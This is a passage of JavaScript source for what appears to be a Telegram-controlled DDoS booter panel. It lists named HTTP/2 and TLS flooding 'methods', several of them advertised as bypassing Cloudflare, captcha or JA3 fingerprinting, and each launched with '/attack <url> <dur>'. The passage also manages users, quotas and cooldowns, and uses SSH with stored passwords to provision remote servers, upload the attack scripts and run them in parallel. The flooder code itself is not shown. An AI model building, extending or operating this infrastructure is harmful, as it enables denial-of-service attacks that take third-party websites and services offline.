  { id:'crush', name:'C-Rush', file:'l.js', builtin:true, emoji:'💥', desc:'HTTP/1.1 + HTTP/2 Mixed RushAway', example:'/attack crush <url> <dur> [threads] [rate]', parse:parseCrush },
  { id:'blast', name:'Blast', file:'blast.js', builtin:true, emoji:'💣', desc:'HTTP/2 multiplexing flooder with HPACK', example:'/attack blast <url> <dur> [threads] [rate]', parse:parseRateFirst },
  { id:'crush2', name:'C-Rush v2', file:'c-rush.js', builtin:true, emoji:'🎯', desc:'C-Rush alternate build', example:'/attack crush2 <url> <dur> [threads] [rate]', parse:parseCrush },
  { id:'darbost', name:'Darbost', file:'darbost.js', builtin:true, emoji:'⚡', desc:'HTTP/2 darbost multiplex flooder', example:'/attack darbost <url> <dur> [threads] [rate]', parse:parseRateFirst },
  { id:'h2gec', name:'H2-GEC', file:'h2gec.js', builtin:true, emoji:'🌀', desc:'HTTP/2 GEC multiplexing with JA3', example:'/attack h2gec <url> <dur> [threads] [rate]', parse:parseRateFirst },
  { id:'http', name:'HTTP-Flood', file:'http.js', builtin:true, emoji:'🌊', desc:'Plain HTTP/1.1 flooder (no TLS)', example:'/attack http <url> <dur> [threads] [rate]', parse:parseThreadsFirst },
  { id:'pvhttp', name:'PV-HTTP', file:'pv-http.js', builtin:true, emoji:'🔮', desc:'PV L7 flooder with JA3 evasion + adaptive burst', example:'/attack pvhttp <url> <dur> [conc]', parse:parsePvHttp },
  { id:'tlsbypass', name:'TLS-Bypass', file:'tls.js', builtin:true, emoji:'🔐', desc:'Classic TLS bypass HTTP/2 flooder', example:'/attack tlsbypass <url> <dur> [threads] [rate]', parse:parseRateFirst },
  { id:'tls', name:'TLS', file:'tls-v3.js', builtin:true, emoji:'🛡', desc:'TLS v3 · conn×streams · profiles', example:'/attack tls <url> <dur> [conn] [streams] [profile]', parse:parseTlsV3, parseIntensity:parseIntensityTlsV3 },
  { id:'bypass2', name:'BYPASS v2', file:'BYPASSv2.js', builtin:true, emoji:'🔓', desc:'BYPASS v2 · captcha support', example:'/attack bypass2 <url> <dur> [threads] [rate] [captcha]', parse:parseBypassV2 },
  { id:'hhttps', name:'H-HTTPS', file:'H-HTTPS.js', builtin:true, emoji:'🔷', desc:'H-HTTPS · IPv4/localhost modes', example:'/attack hhttps <url> <dur> [rate] [threads] [ipv4|localhost]', parse:parseHHttps },
  { id:'httpkill', name:'HTTP-KILL', file:'HTTP-KILL.js', builtin:true, emoji:'☠️', desc:'HTTP-KILL · raw throughput flooder', example:'/attack httpkill <url> <dur> [threads] [rate]', parse:parseHttpKill },
  { id:'gcf', name:'G-CF', file:'G-CF.js', builtin:true, emoji:'☁️', desc:'G-CF · Cloudflare TLS 1.2/1.3 bypass', example:'/attack gcf <url> <dur> [threads] [rate]', parse:parseGCf },
  { id:'h2referer', name:'H2-REFERER', file:'H2-REFERER.js', builtin:true, emoji:'🎭', desc:'H2 referer spoofing + TLS cipher shuffle', example:'/attack h2referer <url> <dur> [rate] [threads]', parse:parseH2Referer },
  { id:'h2core', name:'H2-CORE', file:'H2-CORE.js', builtin:true, emoji:'🧬', desc:'H2-CORE · auto port detection', example:'/attack h2core <url> <dur> [threads] [rate]', parse:parseH2Core },
  { id:'h2hybrid', name:'H2-HYBRID', file:'H2-HYBRID.js', builtin:true, emoji:'🔀', desc:'H2-HYBRID · mixed protocol flooder', example:'/attack h2hybrid <url> <dur> [threads] [rate]', parse:parseH2Hybrid },
  { id:'cloud', name:'CLOUD', file:'CLOUD.js', builtin:true, emoji:'⛅', desc:'CLOUD · cloudflare-targeted flooder', example:'/attack cloud <url> <dur> [threads] [rate]', parse:parseCloud },
  { id:'httpsbypass', name:'HTTPS-BYPASS', file:'HTTPS-BYPASS.js', builtin:true, emoji:'🔑', desc:'HTTPS-BYPASS · advanced bypass flooder', example:'/attack httpsbypass <url> <dur> [rate] [threads] [options]', parse:parseHttpsBypass },
];

function getMethodState(id) {
  const s = store.methodstate.get();
  return s[id] || { enabled: true, minCooldown: 0, stats: { launches: 0, lastAt: 0, lastBy: null } };
}
function updateMethodState(id, patch) {
  store.methodstate.mutate(s => {
    s[id] = { ...(s[id] || { enabled: true, minCooldown: 0, stats: { launches: 0, lastAt: 0, lastBy: null } }), ...patch };
  });
}
function bumpMethodStats(id, userId) {
  store.methodstate.mutate(s => {
    if (!s[id]) s[id] = { enabled: true, minCooldown: 0, stats: { launches: 0, lastAt: 0, lastBy: null } };
    if (!s[id].stats) s[id].stats = { launches: 0, lastAt: 0, lastBy: null };
    s[id].stats.launches++;
    s[id].stats.lastAt = Date.now();
    s[id].stats.lastBy = userId;
  });
}
const isMethodEnabled = id => getMethodState(id).enabled !== false;
const getMethodCooldown = id => getMethodState(id).minCooldown || 0;

function allMethods() {
  const custom = store.methods.get().map(m => {
    const tpl = Array.isArray(m.template) ? templateToString(m.template) : (m.template || '');
    return {
      id: m.id, name: m.name || m.id, file: m.file, builtin: false, emoji: '🔧',
      desc: m.desc || 'Custom method', template: tpl, sample: m.sample || '',
      example: m.example || `/attack ${m.id} <url> <dur>`,
      addedAt: m.addedAt,
      parse: a => {
        const [target, duration, threads = String(CONFIG.DEFAULT_THREADS), rate = String(CONFIG.DEFAULT_RATE)] = a;
        if (!target || !duration) throw new Error('Target and duration required');
        if (!tpl) throw new Error('Method has no template');
        return { target, duration, threads, rate, args: buildArgsFromTemplate(tpl, target, duration, threads, rate) };
      },
    };
  });
  return [...BUILTIN_METHODS, ...custom].map(m => {
    const st = getMethodState(m.id);
    return { ...m, enabled: st.enabled !== false, minCooldown: st.minCooldown || 0, stats: st.stats || { launches: 0 } };
  });
}
const getMethod = id => allMethods().find(m => m.id === id);
const availableMethods = () => allMethods().filter(m => fs.existsSync(path.join(CONFIG.SCRIPT_DIR, m.file)));

function userCanUseMethod(user, id) {
  if (isAdmin(user.telegramId)) return true;
  if (!isMethodEnabled(id)) return false;
  const am = user.allowedMethods;
  if (am === null || am === undefined) return true;
  return Array.isArray(am) && am.includes(id);
}
function visibleMethodsFor(user) {
  return availableMethods().filter(m => {
    if (!m.enabled && !isAdmin(user.telegramId)) return false;
    return userCanUseMethod(user, m.id);
  });
}

function validateMethodFile(file) {
  return new Promise(resolve => {
    const p = path.join(CONFIG.SCRIPT_DIR, file);
    if (!fs.existsSync(p)) return resolve({ ok: false, error: 'File not found' });
    let done = false;
    const finish = r => { if (!done) { done = true; resolve(r); } };
    let child;
    try { child = spawn(process.execPath, ['--check', p], { stdio: 'pipe' }); }
    catch (e) { return finish({ ok: false, error: e.message }); }
    let err = '';
    child.stderr.on('data', d => { err += d.toString(); });
    child.on('exit', code => finish(code === 0 ? { ok: true } : { ok: false, error: (err || 'syntax error').slice(0, 160) }));
    const t = setTimeout(() => { try { child.kill('SIGKILL'); } catch {} finish({ ok: true }); }, CONFIG.METHOD_VALIDATE_TIMEOUT);
    t.unref();
  });
}

/* ══════════════════════════════════════════════════════════════════════════
   USERS
   ══════════════════════════════════════════════════════════════════════════ */

const DEFAULT_LIMITS = { maxDuration: 300, maxThreads: 16, maxRate: 90, maxConcurrent: 1, maxServers: 2, cooldown: CONFIG.DEFAULT_COOLDOWN };
const ADMIN_LIMITS = { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, maxServers: 0, cooldown: 0 };

const getUser = id => store.users.get()[String(id)] || null;
const isOwner = id => CONFIG.ADMIN_IDS.includes(Number(id));
const isAdmin = id => isOwner(id) || (getUser(id)?.role === 'admin');

function upsertUser(id, patch) {
  const key = String(id);
  let out;
  store.users.mutate(u => {
    u[key] = { ...(u[key] || {}), ...patch, updatedAt: new Date().toISOString() };
    out = u[key];
  });
  return out;
}
function ensureUser(msg) {
  const id = msg.from.id;
  const existing = getUser(id);
  if (existing) return existing;
  const owner = isOwner(id);
  return upsertUser(id, {
    telegramId: id, username: msg.from.username || null, firstName: msg.from.first_name || null,
    role: owner ? 'admin' : 'pending',
    isOwner: owner,
    createdAt: new Date().toISOString(),
    limits: owner ? { ...ADMIN_LIMITS } : { ...DEFAULT_LIMITS },
    allowedMethods: null, lastMethod: null, lastTarget: null, attackCount: 0,
  });
}
const userActiveCount = id => Object.values(store.sessions.get()).filter(x => x.owner === id && x.status === 'running').length;
const userActiveBatches = id => {
  const sessions = Object.values(store.sessions.get()).filter(x => x.owner === id && x.status === 'running');
  return new Set(sessions.map(s => s.batchId)).size;
};

function checkUserLimits(user, d, th, r, opts = {}) {
  const l = user.limits || {};
  if (l.maxDuration > 0 && Number(d) > l.maxDuration) throw new Error(`Max duration ${l.maxDuration}s`);
  if (!opts.skipThreads && l.maxThreads > 0 && Number(th) > l.maxThreads) throw new Error(`Max threads ${l.maxThreads}`);
  if (l.maxRate > 0 && Number(r) > l.maxRate) throw new Error(`Max rate ${l.maxRate}`);
}

function roleBadge(u) {
  if (!u) return '❓';
  if (isOwner(u.telegramId)) return '👑';
  if (u.role === 'admin') return '🛡';
  if (u.role === 'user') return '✅';
  if (u.role === 'banned') return '🚫';
  return '⏳';
}
function roleLabel(u) { if (isOwner(u.telegramId)) return 'owner'; return u.role || 'pending'; }

function setCooldown(userId, seconds) {
  if (seconds > 0) store.cooldowns.mutate(c => { c[String(userId)] = { until: Date.now() + seconds * 1000 }; });
}
function getCooldownLeft(userId) {
  const c = store.cooldowns.get()[String(userId)];
  if (!c) return 0;
  const left = Math.ceil((c.until - Date.now()) / 1000);
  return left > 0 ? left : 0;
}

function getFavorites(userId) {
  const all = store.favorites.get()[String(userId)] || [];
  return Array.isArray(all) ? all.filter(id => getMethod(id)) : [];
}
function toggleFavorite(userId, methodId) {
  let added = false;
  store.favorites.mutate(f => {
    const key = String(userId);
    if (!Array.isArray(f[key])) f[key] = [];
    const idx = f[key].indexOf(methodId);
    if (idx >= 0) f[key].splice(idx, 1);
    else { f[key].push(methodId); added = true; }
    if (f[key].length > 8) f[key] = f[key].slice(-8);
  });
  return added;
}

/* ══════════════════════════════════════════════════════════════════════════
   SERVERS + SSH
   ══════════════════════════════════════════════════════════════════════════ */

const serverConns = new Map();
const connLastUsed = new Map();
const healthCache = new Map();
const warmupSet = new Set();
const remoteEnvCache = new Map();
const remoteHashCache = new Map();
const remoteDepsCache = new Map();
const provisioningSet = new Set();

const getServer = id => store.servers.get().find(s => s.id === id);

function upsertServer(patch) {
  store.servers.mutate(list => {
    const i = list.findIndex(s => s.id === patch.id);
    if (i >= 0) list[i] = { ...list[i], ...patch }; else list.push(patch);
  });
  return patch;
}

function removeServer(id) {
  const c = serverConns.get(id);
  if (c) { try { c.end(); } catch {} serverConns.delete(id); }
  connLastUsed.delete(id);
  healthCache.delete(id); remoteEnvCache.delete(id); remoteDepsCache.delete(id);
  for (const k of [...remoteHashCache.keys()]) if (k.startsWith(id + ':')) remoteHashCache.delete(k);
  store.servers.mutate(list => { const i = list.findIndex(s => s.id === id); if (i >= 0) list.splice(i, 1); });
  renumberServers();
}

function renumberServers() { store.servers.mutate(list => { list.forEach((s, i) => { s.name = `Server ${i + 1}`; }); }); }

const newServerId = () => 'srv_' + crypto.randomBytes(3).toString('hex');

function serverStats() {
  const list = store.servers.get();
  const online = list.filter(s => s.status === 'online').length;
  const running = Object.values(store.sessions.get()).filter(s => s.status === 'running');
  return {
    total: list.length, online, offline: list.length - online,
    attacking: new Set(running.filter(s => s.where === 'remote' && s.serverId).map(s => s.serverId)).size,
  };
}

function listGroups() {
  const set = new Set(store.groups.get());
  for (const s of store.servers.get()) if (s.group) set.add(s.group);
  return [...set].sort();
}

function serverLoad(serverId) {
  return Object.values(store.sessions.get()).filter(s => s.status === 'running' && s.where === 'remote' && s.serverId === serverId).length;
}

function busyServerIds() {
  return new Set(Object.values(store.sessions.get()).filter(s => s.status === 'running' && s.where === 'remote' && s.serverId).map(s => s.serverId));
}

function allocateServersForAttack(user, intensity, group) {
  let pool;
  if (intensity && INTENSITY[intensity]) pool = getEligibleServers(intensity);
  else pool = store.servers.get().filter(s => s.status === 'online');
  if (group) pool = pool.filter(s => s.group === group);
  if (pool.length === 0) return { servers: [], error: 'no_eligible', total: 0 };

  const busy = busyServerIds();
  const free = pool.filter(s => !busy.has(s.id));
  if (free.length === 0) return { servers: [], error: 'all_busy', total: pool.length, busy: pool.length };

  const limit = user.limits?.maxServers || 0;
  const take = limit > 0 ? Math.min(limit, free.length) : free.length;
  const sorted = [...free].sort((a, b) => serverLoad(a.id) - serverLoad(b.id));
  for (let i = sorted.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    if (serverLoad(sorted[i].id) === serverLoad(sorted[j].id)) [sorted[i], sorted[j]] = [sorted[j], sorted[i]];
  }
  return { servers: sorted.slice(0, take), requestedLimit: limit, availableFree: free.length, totalPool: pool.length };
}

/* ══════════════════════════════════════════════════════════════════════════
   SSH
   ══════════════════════════════════════════════════════════════════════════ */

function sshConnect(server) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    let settled = false;
    const port = Number(server.port) || 22;
    const tag = `${server.host}:${port}`;
    const timer = setTimeout(() => {
      if (!settled) { settled = true; try { conn.end(); } catch {} reject(new Error(`SSH timeout ${CONFIG.SSH_TIMEOUT}ms (${tag})`)); }
    }, CONFIG.SSH_TIMEOUT);

    conn.on('ready', () => { if (!settled) { settled = true; clearTimeout(timer); resolve(conn); } });
    conn.on('error', e => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      try { conn.end(); } catch {}
      const code = e.code || '';
      const level = e.level || '';
      let hint = '';
      if (code === 'ECONNREFUSED') hint = ` → port ${port} tutup. Coba port SSH asli (2222/22022) atau cek firewall.`;
      else if (code === 'ETIMEDOUT') hint = ` → timeout. Firewall block IP VPS bot.`;
      else if (code === 'ENOTFOUND' || code === 'EAI_AGAIN') hint = ` → hostname gak resolve.`;
      else if (code === 'EHOSTUNREACH' || code === 'ENETUNREACH') hint = ` → route gak ada.`;
      else if (level === 'client-authentication') hint = ` → auth gagal (password salah / key-only).`;
      else if (level === 'client-timeout') hint = ` → handshake timeout.`;
      else if (/handshake|kex|algorithm/i.test(e.message)) hint = ` → algoritma mismatch.`;
      reject(new Error(`${e.message}${hint}`));
    });

    try {
      conn.connect({
        host: server.host, port,
        username: server.username, password: server.password,
        readyTimeout: CONFIG.SSH_TIMEOUT,
        keepaliveInterval: 30000, keepaliveCountMax: 3,
        tryKeyboard: true,
      });
    } catch (e) { if (!settled) { settled = true; clearTimeout(timer); reject(e); } }
  });
}

function tcpProbe(host, port, timeoutMs = 5000) {
  return new Promise(resolve => {
    const sock = net.connect({ host, port });
    let done = false;
    const finish = (ok, err) => { if (done) return; done = true; try { sock.destroy(); } catch {} resolve({ ok, err }); };
    sock.setTimeout(timeoutMs);
    sock.on('connect', () => finish(true));
    sock.on('timeout', () => finish(false, 'timeout'));
    sock.on('error', e => finish(false, e.code || e.message));
  });
}

async function sshTest(host, port, username, password, timeoutMs = 15000) {
  const result = { host, port, tcp: null, auth: null, error: null, elapsed: 0 };
  const t0 = Date.now();
  const tcp = await tcpProbe(host, port, 5000);
  result.tcp = tcp.ok ? 'open' : `closed (${tcp.err})`;
  if (!tcp.ok) { result.elapsed = Date.now() - t0; return result; }

  if (username && password) {
    try {
      const conn = await new Promise((res, rej) => {
        const c = new Client();
        let done = false;
        const t = setTimeout(() => { if (!done) { done = true; try { c.end(); } catch {} rej(new Error('auth timeout')); } }, timeoutMs);
        c.on('ready', () => { if (!done) { done = true; clearTimeout(t); res(c); } });
        c.on('error', e => { if (!done) { done = true; clearTimeout(t); try { c.end(); } catch {} rej(e); } });
        c.connect({ host, port, username, password, readyTimeout: timeoutMs, keepaliveInterval: 30000, tryKeyboard: true });
      });
      result.auth = 'ok';
      try { const r = await sshExec(conn, 'node -v 2>/dev/null; uname -m', 8000); result.authInfo = (r.out || '').trim().replace(/\n/g, ' · ') || 'connected'; } catch {}
      try { conn.end(); } catch {}
    } catch (e) { result.auth = 'fail'; result.error = e.message; }
  }
  result.elapsed = Date.now() - t0;
  return result;
}

function sshExec(conn, cmd, timeoutMs = CONFIG.SSH_EXEC_TIMEOUT) {
  return new Promise(resolve => {
    let done = false;
    const t = setTimeout(() => { if (!done) { done = true; resolve({ code: -1, out: '', err: 'exec timeout' }); } }, timeoutMs);
    try {
      conn.exec(cmd, (err, stream) => {
        if (err) { clearTimeout(t); done = true; return resolve({ code: -1, out: '', err: err.message }); }
        let out = '', errOut = '';
        stream.on('data', d => { out += d.toString(); });
        stream.stderr.on('data', d => { errOut += d.toString(); });
        stream.on('close', code => { clearTimeout(t); done = true; resolve({ code: code || 0, out, err: errOut }); });
      });
    } catch (e) { clearTimeout(t); done = true; resolve({ code: -1, out: '', err: e.message }); }
  });
}

function sshUpload(conn, local, remote) {
  return new Promise((resolve, reject) => {
    conn.sftp((err, sftp) => {
      if (err) return reject(err);
      sftp.fastPut(local, remote, e => { try { sftp.end(); } catch {} e ? reject(e) : resolve(); });
    });
  });
}

async function getServerConn(id) {
  if (serverConns.has(id)) {
    const c = serverConns.get(id);
    if (c._ready) { connLastUsed.set(id, Date.now()); return c; }
    serverConns.delete(id);
  }
  const server = getServer(id);
  if (!server) throw new Error('Server not found: ' + id);
  const conn = await sshConnect(server);
  conn._ready = true;
  conn.on('close', () => { serverConns.delete(id); connLastUsed.delete(id); remoteEnvCache.delete(id); });
  conn.on('error', () => { serverConns.delete(id); connLastUsed.delete(id); remoteEnvCache.delete(id); });
  serverConns.set(id, conn);
  connLastUsed.set(id, Date.now());
  return conn;
}

setInterval(() => {
  const now = Date.now();
  for (const [id, last] of connLastUsed) {
    if (now - last > CONFIG.CONN_IDLE_MS && !busyServerIds().has(id)) {
      const c = serverConns.get(id);
      if (c) { try { c.end(); } catch {} serverConns.delete(id); }
      connLastUsed.delete(id);
    }
  }
}, 120000).unref();

async function provisionRemote(serverId, conn, onProgress) {
  if (provisioningSet.has(serverId)) throw new Error('provisioning already in progress');
  provisioningSet.add(serverId);
  const say = msg => { try { onProgress && onProgress(msg); } catch {} };
  try {
    say('🔍 checking environment…');
    const quick = await sshExec(conn,
      `bash -lc 'for p in "$(command -v node 2>/dev/null)" /usr/local/bin/node /usr/bin/node /opt/node/bin/node /root/.nvm/versions/node/*/bin/node; do if [ -x "$p" ] && "$p" -v >/dev/null 2>&1; then echo "OK:$p"; break; fi; done'`, 10000);

    let env = null;
    if ((quick.out || '').includes('OK:')) {
      say('✅ node already installed');
      env = await collectRemoteEnv(serverId, conn);
    } else {
      say('📦 installing Node.js 20…');
      const pmCheck = await sshExec(conn, `command -v apt-get >/dev/null && echo apt; command -v yum >/dev/null && echo yum; command -v apk >/dev/null && echo apk`, 8000);
      const pm = (pmCheck.out || '').trim();
      const script = ['set -e', 'export DEBIAN_FRONTEND=noninteractive', 'echo "===[provision] start==="'];
      if (pm.includes('apt')) {
        script.push('apt-get update -y', 'apt-get install -y curl ca-certificates build-essential gnupg || true', 'curl -fsSL https://deb.nodesource.com/setup_20.x | bash -', 'apt-get install -y nodejs');
      } else if (pm.includes('yum')) {
        script.push('yum install -y curl ca-certificates gcc-c++ make || true', 'curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -', 'yum install -y nodejs');
      } else if (pm.includes('apk')) {
        script.push('apk add --no-cache nodejs npm bash curl ca-certificates');
      } else {
        script.push(
          'ARCH=$(uname -m)', 'case "$ARCH" in x86_64) NODE_ARCH=x64;; aarch64) NODE_ARCH=arm64;; *) NODE_ARCH=x64;; esac',
          'NODE_VER=20.18.0', 'cd /tmp',
          'curl -fsSL "https://nodejs.org/dist/v${NODE_VER}/node-v${NODE_VER}-linux-${NODE_ARCH}.tar.xz" -o node.tar.xz',
          'tar -xJf node.tar.xz', 'cp -r node-v${NODE_VER}-linux-${NODE_ARCH}/* /usr/local/',
          'ln -sf /usr/local/bin/node /usr/bin/node || true', 'ln -sf /usr/local/bin/npm /usr/bin/npm || true',
          'rm -rf /tmp/node.tar.xz /tmp/node-v${NODE_VER}-linux-${NODE_ARCH}'
        );
      }
      script.push('mkdir -p /root/attack', 'echo "===[provision] done==="', 'bash -lc "command -v node; node -v" || true');
      const r = await sshExec(conn, script.join('\n'), CONFIG.PROVISION_TIMEOUT);
      const combined = (r.out || '') + '\n' + (r.err || '');
      if (!combined.includes('[provision] done')) throw new Error('provision failed: ' + combined.slice(-250));
      env = await collectRemoteEnv(serverId, conn);
      if (!env.nodePath) throw new Error('provision done but node not found');
      say(`✅ installed node ${env.version}`);
    }

    say('📦 checking deps…');
    try {
      const deps = await ensureDepsOnRemote(conn, serverId, env, say);
      if (deps.installed) say(`✅ installed ${deps.installedList?.join(', ') || 'deps'}`);
      else say('✅ deps already present');
    } catch (e) { say('⚠️ deps: ' + e.message.slice(0, 100)); }
    return env;
  } finally { provisioningSet.delete(serverId); }
}

async function collectRemoteEnv(serverId, conn) {
  const finder = [
    'set +e',
    'for p in "$(command -v node 2>/dev/null)" /usr/local/bin/node /usr/bin/node /opt/node/bin/node /root/.nvm/versions/node/*/bin/node; do',
    '  if [ -x "$p" ] && "$p" -v >/dev/null 2>&1; then echo "NODE:$p"; break; fi',
    'done',
    'echo "CORES:$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo)"',
    'echo "MEM_KB:$(awk \'/MemTotal/ {print $2}\' /proc/meminfo 2>/dev/null)"',
    'echo "ARCH:$(uname -m)"',
    'echo "DISK_AVAIL:$(df -BG / 2>/dev/null | tail -1 | awk \'{print $4}\' | tr -d G)"',
  ].join('\n');

  const r = await sshExec(conn, `bash -lc ${shellQuote(finder)}`, 12000);
  const out = r.out || '';
  const nodeMatch = out.match(/NODE:(\S+)/);
  const coresMatch = out.match(/CORES:(\d+)/);
  const memMatch = out.match(/MEM_KB:(\d+)/);
  const archMatch = out.match(/ARCH:(\S+)/);
  const diskMatch = out.match(/DISK_AVAIL:(\d+)/);

  const nodePath = nodeMatch ? nodeMatch[1] : null;
  let version = null;
  if (nodePath) {
    const verR = await sshExec(conn, `${shellQuote(nodePath)} -v`, 5000);
    version = (verR.out || '').trim().replace(/^v/, '') || null;
  }
  const cores = coresMatch ? parseInt(coresMatch[1], 10) : 0;
  const memMB = memMatch ? Math.round(parseInt(memMatch[1], 10) / 1024) : 0;
  const arch = archMatch ? archMatch[1] : '?';
  const diskGB = diskMatch ? parseInt(diskMatch[1], 10) : 0;

  const env = { nodePath, version, cores, memMB, arch, diskGB, at: Date.now() };
  if (nodePath) remoteEnvCache.set(serverId, env);
  return env;
}

async function ensureRemoteReady(serverId, conn, onProgress) {
  let env = null;
  try { env = await collectRemoteEnv(serverId, conn); } catch {}
  if (env && env.nodePath) return env;
  if (!CONFIG.AUTO_PROVISION) throw new Error('node not installed on remote');
  return provisionRemote(serverId, conn, onProgress);
}

async function ensureDepsOnRemote(conn, serverId, env, onProgress) {
  const rawDeps = getAllMethodDeps();
  if (!rawDeps.length) return { installed: false, installedList: [] };
  const deps = pinDeps(rawDeps);
  const cacheKey = deps.slice().sort().join(',');
  const say = msg => { try { onProgress && onProgress(msg); } catch {} };

  const cached = remoteDepsCache.get(serverId);
  if (cached && cached.ok && cached.key === cacheKey && Date.now() - cached.at < CONFIG.REMOTE_ENV_TTL) {
    return { installed: false, cached: true };
  }

  const pkgNames = deps.map(d => d.replace(/@.*$/, ''));
  const checkScript = [
    'set +e',
    `cd ${shellQuote(CONFIG.REMOTE_DIR)} 2>/dev/null || { echo "DEPS_NO_DIR"; exit 0; }`,
    `NODE_BIN=${shellQuote(env.nodePath)}`,
    'MISSING=""',
    `for m in ${pkgNames.map(shellQuote).join(' ')}; do`,
    '  if ! "$NODE_BIN" -e "require.resolve(\'$m\')" >/dev/null 2>&1; then MISSING="$MISSING $m"; fi',
    'done',
    'if [ -z "$MISSING" ]; then echo "DEPS_OK"; else echo "DEPS_MISSING:$MISSING"; fi',
  ].join('\n');

  const check = await sshExec(conn, checkScript, 15000);
  const out = (check.out || '').trim();
  if (out.includes('DEPS_OK')) {
    remoteDepsCache.set(serverId, { ok: true, key: cacheKey, at: Date.now() });
    return { installed: false };
  }

  const missing = ((out.match(/DEPS_MISSING:(.*)/) || [])[1] || rawDeps.join(' ')).trim();
  say(`📦 installing: ${missing}`);

  const npmCheck = await sshExec(conn, `bash -lc 'command -v npm 2>/dev/null || echo "${env.nodePath.replace(/\/node$/, '/npm')}"'`, 8000);
  const npmPath = (npmCheck.out || '').trim().split('\n')[0] || 'npm';

  const installScript = [
    'set +e',
    `cd ${shellQuote(CONFIG.REMOTE_DIR)} || { echo "NPM_CD_FAIL"; exit 1; }`,
    `[ -f package.json ] || echo '{"name":"remote-attack","private":true,"version":"1.0.0"}' > package.json`,
    `setsid ${shellQuote(npmPath)} install ${deps.map(shellQuote).join(' ')} --no-audit --no-fund --silent < /dev/null > /tmp/deps_install.log 2>&1 &`,
    'NPM_PID=$!', 'echo "NPM_PID:$NPM_PID"', 'WAITED=0',
    'while kill -0 $NPM_PID 2>/dev/null && [ $WAITED -lt 120 ]; do sleep 2; WAITED=$((WAITED+1)); done',
    'if kill -0 $NPM_PID 2>/dev/null; then echo "NPM_TIMEOUT"; kill -9 $NPM_PID 2>/dev/null; exit 2; fi',
    'wait $NPM_PID', 'echo "NPM_RC:$?"', 'echo "--- npm log tail ---"', 'tail -12 /tmp/deps_install.log 2>/dev/null',
    'echo "--- dep require check ---"', `NODE_BIN=${shellQuote(env.nodePath)}`,
    `for m in ${pkgNames.map(shellQuote).join(' ')}; do`,
    '  if "$NODE_BIN" -e "require.resolve(\'$m\')" >/dev/null 2>&1; then echo "OK:$m"; else echo "FAIL:$m"; fi',
    'done',
  ].join('\n');

  const install = await sshExec(conn, installScript, CONFIG.DEPS_INSTALL_TIMEOUT);
  const result = install.out || '';
  const failed = (result.match(/FAIL:(\S+)/g) || []).map(s => s.replace('FAIL:', ''));
  if (failed.length) {
    const logTail = (result.match(/--- npm log tail ---\n([\s\S]*?)\n--- dep require check ---/) || [])[1] || '';
    remoteDepsCache.set(serverId, { ok: false, key: cacheKey, missing: failed.join(','), at: Date.now() });
    throw new Error(`deps install failed (${failed.join(',')}): ${logTail.slice(-300) || result.slice(-200)}`);
  }
  remoteDepsCache.set(serverId, { ok: true, key: cacheKey, at: Date.now() });
  return { installed: true, missing, installedList: pkgNames };
}

async function ensureAuxOnRemote(conn, serverId, fileName) {
  const localPath = path.join(CONFIG.SCRIPT_DIR, fileName);
  if (!fs.existsSync(localPath)) return { skipped: true, reason: 'local missing' };
  const localHash = crypto.createHash('sha1').update(fs.readFileSync(localPath)).digest('hex');
  const cacheKey = `${serverId}:aux:${fileName}`;
  const remoteHashR = await sshExec(conn, `sha1sum ${shellQuote(CONFIG.REMOTE_DIR + '/' + fileName)} 2>/dev/null | awk '{print $1}'`, 6000);
  const remoteHash = (remoteHashR.out || '').trim();
  if (remoteHash === localHash && remoteHashCache.get(cacheKey) === localHash) return { uploaded: false, hash: localHash };
  await sshUpload(conn, localPath, `${CONFIG.REMOTE_DIR}/${fileName}`);
  remoteHashCache.set(cacheKey, localHash);
  return { uploaded: true, hash: localHash };
}

async function ensureMethodOnRemote(conn, serverId, fileName) {
  const localPath = path.join(CONFIG.SCRIPT_DIR, fileName);
  if (!fs.existsSync(localPath)) throw new Error(`local missing: ${fileName}`);
  const localHash = crypto.createHash('sha1').update(fs.readFileSync(localPath)).digest('hex');
  await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 8000);
  const remoteHashR = await sshExec(conn, `sha1sum ${shellQuote(CONFIG.REMOTE_DIR + '/' + fileName)} 2>/dev/null | awk '{print $1}'`, 6000);
  const remoteHash = (remoteHashR.out || '').trim();
  const cacheKey = `${serverId}:${fileName}`;
  if (remoteHash === localHash && remoteHashCache.get(cacheKey) === localHash) {
    for (const aux of AUX_FILES) { try { await ensureAuxOnRemote(conn, serverId, aux); } catch {} }
    return { uploaded: false, hash: localHash };
  }
  await sshUpload(conn, localPath, `${CONFIG.REMOTE_DIR}/${fileName}`);
  remoteHashCache.set(cacheKey, localHash);
  for (const aux of AUX_FILES) { try { await ensureAuxOnRemote(conn, serverId, aux); } catch {} }
  return { uploaded: true, hash: localHash };
}

async function prewarmServers(ids) {
  const toWarm = ids.filter(id => !serverConns.has(id) && !warmupSet.has(id));
  toWarm.forEach(id => warmupSet.add(id));
  await Promise.allSettled(toWarm.map(async id => {
    try { await getServerConn(id); } catch {}
    warmupSet.delete(id);
  }));
}

async function checkServerHealth(id, force = false) {
  const cached = healthCache.get(id);
  if (cached && cached._inflight) return cached;
  if (!force && cached && Date.now() - cached.at < CONFIG.HEALTH_CACHE_TTL) return cached;
  healthCache.set(id, { ...(cached || {}), _inflight: true, at: cached?.at || 0 });
  try {
    const conn = await getServerConn(id);
    const r = await sshExec(conn, 'echo ok; uptime', 10000);
    const online = r.out.includes('ok');
    const load = (r.out.match(/load average: ([^\n]+)/) || [])[1] || '?';
    let env = null;
    try { env = await collectRemoteEnv(id, conn); } catch {}
    const result = { online, load, env, at: Date.now(), _inflight: false };
    healthCache.set(id, result);
    upsertServer({ id, status: online ? 'online' : 'offline', lastCheck: Date.now() });
    return result;
  } catch (e) {
    const result = { online: false, load: '?', error: e.message, at: Date.now(), _inflight: false };
    healthCache.set(id, result);
    upsertServer({ id, status: 'offline', lastCheck: Date.now() });
    return result;
  }
}

async function syncMethodToServer(serverId, methodFile = null) {
  const conn = await getServerConn(serverId);
  await sshExec(conn, `mkdir -p ${CONFIG.REMOTE_DIR}`, 10000);
  const out = { method: false, proxy: false, aux: [], deps: false };
  const files = methodFile ? [methodFile] : [...new Set([...allMethods().map(m => m.file)])];
  for (const file of files) {
    const local = path.join(CONFIG.SCRIPT_DIR, file);
    if (!fs.existsSync(local)) continue;
    try { await ensureMethodOnRemote(conn, serverId, file); out.method = true; } catch {}
  }
